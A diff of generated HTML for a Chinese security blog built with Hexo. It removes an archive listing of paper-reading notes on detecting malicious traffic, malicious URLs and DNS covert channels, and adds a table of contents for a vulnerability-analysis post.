-      <a href="/2021/02/28/Darknet%20Traffic%20Big-Data%20Analysis%20and%20Network%20Management%20to%20Real-Time%20Automating%20the%20Malicious%20Intent%20Detection%20Process%20by%20a%20Weight%20Agnostic%20Neural%20Networks%20Framework/">
-        Darknet Traffic Big-Data Analysis and Network Management to Real-Time Automating the Malicious Intent Detection Process by a Weight Agnostic Neural Networks Framework
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      
-        文章题目也太长了，翻译过来就是： 暗网流量大数据分析和网络管理，通过权重不可知的神经网络框架 实时自动执行恶意意图检测过程。
-作者分别来自：(1) 国际希腊大学理学院物理系、复杂系统实验室。(2) Democritus大学 电气与计算机工程系 (3) 希腊国防总参谋部 (4) 爱琴海大学 (5)  Democritus大学土木工程系工程学院、数学编程学院。
-摘要：网络流量分析产品的目的就是：...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-02-28</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2021/02/28/Darknet%20Traffic%20Big-Data%20Analysis%20and%20Network%20Management%20to%20Real-Time%20Automating%20the%20Malicious%20Intent%20Detection%20Process%20by%20a%20Weight%20Agnostic%20Neural%20Networks%20Framework/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/02/21/%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E7%9A%84%E8%87%AA%E5%8A%A8%E7%89%B9%E5%BE%81%E7%94%9F%E6%88%90%E7%AE%97%E6%B3%95/">
-        恶意流量的自动特征生成算法
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      
-        本文作者来自于：绿盟科技、清华大学、哈尔滨工业大学。本文发表于2020 IEEE 19th International Conference on Trust, Security and Privacy in Computing and Communications (TrustCom)，属于CCF- C类会议。
-一、背景及目的​    ML在检测攻击行为时，可能有如下问题：虚假报警率过高；...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-02-21</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/paper%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/">paper阅读笔记</a>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2021/02/21/%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E7%9A%84%E8%87%AA%E5%8A%A8%E7%89%B9%E5%BE%81%E7%94%9F%E6%88%90%E7%AE%97%E6%B3%95/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/02/09/%E6%81%B6%E6%84%8FURL%E5%9B%9B/">
-        恶意URL检测(四)五篇机器学习文章
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      
-        六、使用机器学习的恶意URL检测综述文章标题：Malicious URL Detection using Machine Learning:A Survey，三位作者来自新加坡管理大学
-1、特征分类
-(1)黑名单特征：(改变一点就检测不到了)
-(2)词汇特征：
-传统的方法如下：
-URL字符串的静态属性(如URL长度，每个属性的长度，特殊字符串的数量)、词袋、n-gram
-[35]从URL中提...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-02-09</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/web/">web</a>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2021/02/09/%E6%81%B6%E6%84%8FURL%E5%9B%9B/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/02/08/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
-        反序列化漏洞
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-02-08</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2021/02/08/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/02/03/%E5%9F%BA%E4%BA%8ELSTM%E6%A8%A1%E5%9E%8B%E7%9A%84DNS%E9%9A%90%E8%94%BD%E4%BF%A1%E9%81%93%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95/">
-        基于LSTM模型的DNS隐蔽信道检测方法
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      
-        本文发表于Computers &amp; Security，作者来自于北航、软件所、应急响应技术中心，发表时间2020年10月。
-一、背景及目的1、DNS(域名系统)作用是将域名转为IP地址。防火墙一般不过滤DNS，攻击者通常使用DNS来构建隐蔽通道。
-2、构建DNS隐蔽信道的方法大致分为两类：基于IP连接的 和 基于查询域名的。
-3、文中解释了DNS隐蔽信道的实现过程。
-4、DNS隐蔽信道...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-02-03</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/paper%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/">paper阅读笔记</a>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2021/02/03/%E5%9F%BA%E4%BA%8ELSTM%E6%A8%A1%E5%9E%8B%E7%9A%84DNS%E9%9A%90%E8%94%BD%E4%BF%A1%E9%81%93%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-    
-  </section>
-  
-    
-      <br>
-      <div class="prev-next">
-        
-        <p class="current">
-          1 / 2
-        </p>
-        
-          <a class="next" rel="next" href="/archives/2021/page/2/">
-            <section class="post next white-box shadow">
-              &nbsp;Next&nbsp;<i class="fas fa-chevron-right" aria-hidden="true"></i>
-            </section>
-          </a>
-        
-      </div>
-    
-  
 
 
-	
+
 </div>
 <aside class='l_side'>
   
@@ -913,141 +579,28 @@ URL字符串的静态属性(如URL长度，每个属性的长度，特殊字符�
     
     
 
-<section class="widget blogger shadow desktop mobile">
-  <div class='content'>
-    
-      
-        <a class='avatar flat-box rectangle' href='/about/'>
-          <img no-lazy src='https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/Logo-NavBar@3x.png'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-        
-        
-          <p><span id="jinrishici-sentence">虽然没什么用但还是想记下来</span></p>
-          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="/atom.xml"
-              class="social fas fa-rss flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="mailto:me@xxx.com"
-              class="social fas fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="https://github.com/volantis-x/"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="/"
-              class="social fas fa-headphones-alt flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
 
-  
 
-  
-    
-    
-  
-
-  <section class="widget category shadow desktop">
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
     
   <header>
     
-      <a href='/blog/categories/'><i class="fas fa-folder-open fa-fw" aria-hidden="true"></i><span class='name'>文章分类</span></a>
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
     
   </header>
 
 
     <div class='content'>
-      <ul class="entry navigation">
-        
-          <li><a class="flat-box"
-            title="/categories/paper%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/" href="/categories/paper%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"
-            id="categoriespaperE99885E8AFBBE7AC94E8AEB0"
-            ><div class='name'>paper阅读笔记</div><div class='badge'>(6)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/web/" href="/categories/web/"
-            id="categoriesweb"
-            ><div class='name'>web</div><div class='badge'>(4)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/"
-            id="categoriesE4BA8CE8BF9BE588B6"
-            ><div class='name'>二进制</div><div class='badge'>(2)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/%E6%9D%82%E8%AE%B0/" href="/categories/%E6%9D%82%E8%AE%B0/"
-            id="categoriesE69D82E8AEB0"
-            ><div class='name'>杂记</div><div class='badge'>(3)</div></a></li>
-        
-      </ul>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91"><span class="toc-text">漏洞触发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-text">静态分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-text">动态分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">利用</span></a></li></ol>
     </div>
   </section>
 
-
-  
-
-  
-    
-    
-  
-
-  <section class="widget tagcloud shadow desktop mobile">
-    
-  <header>
-    
-      <a href='/blog/tags/'><i class="fas fa-tags fa-fw" aria-hidden="true"></i><span class='name'>热门标签</span></a>
-    
-  </header>
-
-
-    <div class='content'>
-      <a href="/tags/DNS%E6%A3%80%E6%B5%8B/" style="font-size: 14px; color: #999">DNS检测</a> <a href="/tags/DoH/" style="font-size: 14px; color: #999">DoH</a> <a href="/tags/ML-DL/" style="font-size: 14px; color: #999">ML&DL</a> <a href="/tags/edge-AI/" style="font-size: 14px; color: #999">edge AI</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 14px; color: #999">sql注入</a> <a href="/tags/unlink/" style="font-size: 14px; color: #999">unlink</a> <a href="/tags/url%E6%A3%80%E6%B5%8B/" style="font-size: 14px; color: #999">url检测</a> <a href="/tags/web/" style="font-size: 24px; color: #555">web</a> <a href="/tags/%E6%81%B6%E6%84%8FURL%E6%A3%80%E6%B5%8B/" style="font-size: 14px; color: #999">恶意URL检测</a> <a href="/tags/%E6%81%B6%E6%84%8Furl%E6%A3%80%E6%B5%8B/" style="font-size: 14px; color: #999">恶意url检测</a> <a href="/tags/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E6%A3%80%E6%B5%8B/" style="font-size: 14px; color: #999">恶意软件检测</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 14px; color: #999">文件包含</a> <a href="/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/" style="font-size: 14px; color: #999">机器学习</a> <a href="/tags/%E7%89%B9%E5%BE%81%E8%87%AA%E5%8A%A8%E7%94%9F%E6%88%90/" style="font-size: 14px; color: #999">特征自动生成</a> <a href="/tags/%E7%94%9F%E6%B4%BB/" style="font-size: 14px; color: #999">生活</a> <a href="/tags/%E9%A1%B6%E4%BC%9ASP/" style="font-size: 14px; color: #999">顶会SP</a>
-    </div>
-  </section>
-
-
-  
 
   
 
 
 </aside>
+
 
 
         
@@ -1064,7 +617,7 @@ URL字符串的静态属性(如URL长度，每个属性的长度，特殊字符�
 
   var l_header=document.getElementById("l_header");
   
-  l_header.classList.remove("show");
+  l_header.classList.add("show");
   
 </script>
 
